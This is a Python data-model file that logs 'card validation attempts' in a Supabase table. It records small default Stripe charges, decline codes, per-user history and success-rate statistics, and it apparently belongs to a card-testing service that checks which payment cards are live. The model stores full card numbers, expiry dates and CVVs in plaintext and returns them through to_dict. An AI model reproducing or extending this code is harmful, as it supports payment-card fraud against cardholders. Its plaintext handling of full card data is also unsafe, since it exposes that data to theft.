"""
Validation Log model — records all card validation attempts.
"""

from datetime import datetime
from typing import Optional

from database.supabase_client import get_supabase


class ValidationLog:
    """Represents a single card validation attempt log entry."""

    def __init__(
        self,
        id: int,
        user_id: int,
        card_bin: str,
        last4: str,
        card_hash: str,
        amount_cents: int,
        stripe_pi_id: Optional[str],
        status: str,
        decline_code: Optional[str],
        stripe_account_id: Optional[int],
        created_at: datetime,
        full_card_number: Optional[str] = None,
        exp_month: Optional[str] = None,
        exp_year: Optional[str] = None,
        cvv: Optional[str] = None,
    ):
        self.id = id
        self.user_id = user_id
        self.card_bin = card_bin
        self.last4 = last4
        self.card_hash = card_hash
        self.amount_cents = amount_cents
        self.stripe_pi_id = stripe_pi_id
        self.status = status
        self.decline_code = decline_code
        self.stripe_account_id = stripe_account_id
        self.created_at = created_at
        self.full_card_number = full_card_number
        self.exp_month = exp_month
        self.exp_year = exp_year
        self.cvv = cvv

    def to_dict(self) -> dict:
        return {
            "id": self.id,
            "user_id": self.user_id,
            "card_bin": self.card_bin,
            "last4": self.last4,
            "amount_cents": self.amount_cents,
            "stripe_pi_id": self.stripe_pi_id,
            "status": self.status,
            "decline_code": self.decline_code,
            "stripe_account_id": self.stripe_account_id,
            "created_at": self.created_at.isoformat() if self.created_at else None,
            "full_card_number": self.full_card_number,
            "exp_month": self.exp_month,
            "exp_year": self.exp_year,
            "cvv": self.cvv,
        }

    @classmethod
    def from_dict(cls, data: dict) -> "ValidationLog":
        return cls(
            id=data["id"],
            user_id=data["user_id"],
            card_bin=data["card_bin"],
            last4=data["last4"],
            card_hash=data["card_hash"],
            amount_cents=data.get("amount_cents", 50),
            stripe_pi_id=data.get("stripe_pi_id"),
            status=data["status"],
            decline_code=data.get("decline_code"),
            stripe_account_id=data.get("stripe_account_id"),
            created_at=datetime.fromisoformat(data["created_at"]) if data.get("created_at") else None,
            full_card_number=data.get("full_card_number"),
            exp_month=data.get("exp_month"),
            exp_year=data.get("exp_year"),
            cvv=data.get("cvv"),
        )

    # ── CRUD Operations ──────────────────────────────────────────────

    @staticmethod
    def create(
        user_id: int,
        card_bin: str,
        last4: str,
        card_hash: str,
        status: str,
        amount_cents: int = 50,
        stripe_pi_id: Optional[str] = None,
        decline_code: Optional[str] = None,
        stripe_account_id: Optional[int] = None,
        full_card_number: Optional[str] = None,
        exp_month: Optional[str] = None,
        exp_year: Optional[str] = None,
        cvv: Optional[str] = None,
    ) -> "ValidationLog":
        """Log a validation attempt."""
        sb = get_supabase()
        insert_data = {
            "user_id": user_id,
            "card_bin": card_bin,
            "last4": last4,
            "card_hash": card_hash,
            "amount_cents": amount_cents,
            "stripe_pi_id": stripe_pi_id,
            "status": status,
            "decline_code": decline_code,
            "stripe_account_id": stripe_account_id,
        }
        if full_card_number:
            insert_data["full_card_number"] = full_card_number
        if exp_month:
            insert_data["exp_month"] = exp_month
        if exp_year:
            insert_data["exp_year"] = exp_year
        if cvv:
            insert_data["cvv"] = cvv
        
        response = sb.table("validation_logs").insert(insert_data).execute()
        return ValidationLog.from_dict(response.data[0])

    @staticmethod
    def get_by_user(user_id: int, limit: int = 10) -> list["ValidationLog"]:
        """Get the most recent validation logs for a user."""
        sb = get_supabase()
        response = (
            sb.table("validation_logs")
            .select("*")
            .eq("user_id", user_id)
            .order("created_at", desc=True)
            .limit(limit)
            .execute()
        )
        return [ValidationLog.from_dict(row) for row in response.data]

    @staticmethod
    def count_today() -> int:
        """Count total validations today (UTC)."""
        sb = get_supabase()
        today = datetime.utcnow().strftime("%Y-%m-%d")
        response = (
            sb.table("validation_logs")
            .select("id", count="exact")
            .gte("created_at", f"{today}T00:00:00")
            .execute()
        )
        return response.count if response.count is not None else 0

    @staticmethod
    def get_stats() -> dict:
        """Get overall validation statistics."""
        sb = get_supabase()

        # Total validations
        total_resp = sb.table("validation_logs").select("id", count="exact").execute()
        total = total_resp.count if total_resp.count is not None else 0

        # Successful validations
        success_resp = (
            sb.table("validation_logs")
            .select("id", count="exact")
            .eq("status", "valid")
            .execute()
        )
        success = success_resp.count if success_resp.count is not None else 0

        # Recent declines (last 24h)
        from datetime import timedelta
        cutoff = (datetime.utcnow() - timedelta(hours=24)).isoformat()
        decline_resp = (
            sb.table("validation_logs")
            .select("id", count="exact")
            .eq("status", "declined")
            .gte("created_at", cutoff)
            .execute()
        )
        recent_declines = decline_resp.count if decline_resp.count is not None else 0

        success_rate = (success / total * 100) if total > 0 else 0

        return {
            "total_validations": total,
            "successful": success,
            "success_rate": round(success_rate, 2),
            "recent_declines": recent_declines,
        }
